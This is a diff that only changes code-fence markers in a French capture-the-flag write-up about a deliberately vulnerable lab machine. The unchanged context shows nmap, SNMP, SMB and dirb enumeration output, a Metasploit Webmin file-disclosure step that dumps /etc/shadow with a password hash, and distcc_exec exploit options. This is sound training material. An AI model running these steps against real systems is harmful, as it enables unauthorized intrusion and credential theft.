@@ -24,7 +24,7 @@ Too much
 
 Il y a énormément de services qui tournent sur la machine (si vous voyez "snip" c'est que j'ai réduit l'output) :  
 
-```plain
+```
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-05-26 13:28 CEST
 Nmap scan report for 192.168.1.29
 Host is up (0.00021s latency).
@@ -153,7 +153,7 @@ On se dit *"super, on va jouer un peu avec NFS !"* sauf que quand on appelle sho
 
 SNMP est quant à lui plus bavard. La chaine de communauté a été laissée à public. Le module snmp\_enum de Metasploit donne énormément d'informations notamment les processus qui tournent, l'espace disque sur les partitions, les interfaces réseau, ports en écoute ou connectés et les processus :  
 
-```plain
+```
 msf auxiliary(snmp_enum) > exploit
 
 [+] 192.168.1.29, Connected.
@@ -174,7 +174,7 @@ System date                   : 2014-5-29 10:32:42.0
 
 Du côté de SMB on obtient certaines informations qui malheureusement ne nous serviront peu (une attaque bruteforce via Hydra n'a permis de récupérer aucun account) :  
 
-```plain
+```
 msf auxiliary(smb_enumshares) > exploit
 
 [*] 192.168.1.29:139 - Unix Samba 3.4.7 (Unknown)
@@ -193,7 +193,7 @@ msf auxiliary(smb_enumusers) > exploit
 
 Côté serveur web il y a là aussi énormément d'applis (trouvées via dirb) :  
 
-```plain
+```
 ---- Scanning URL: http://192.168.1.29/ ----
 + http://192.168.1.29/.htaccess (CODE:200|SIZE:501)
 + http://192.168.1.29/cgi-bin/ (CODE:403|SIZE:288)
@@ -221,7 +221,7 @@ Un pied dans la porte
 
 Du côté du Webmin ce dernier est vulnérable au module *file\_disclosure* de *Metasploit*, on peut ainsi récupérer le /etc/shadow :  
 
-```plain
+```
 root:*:16137:0:99999:7:::
 (...snip...)
 vulnosadmin:$6$SLXu95CH$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p.xbnSVJFAeg1WO28ljNAPrlXaghLmo/:16137:0:99999:7:::
@@ -369,7 +369,7 @@ Cadeau bonux
 
 Alternativement, il est possible d'exploiter le distcc (un serveur de compilation) présent sur le système :  
 
-```plain
+```
 msf exploit(distcc_exec) > show options
 
 Module options (exploit/unix/misc/distcc_exec):
@@ -410,7 +410,7 @@ L'auteur du CTF a visiblement installé le plus de services et de webapps possib
 
 Ainsi dans la racine web, on trouve les dossiers suivants :  
 
-```plain
+```
 dolibarr-3.0.0
 egroupware
 mutillidae
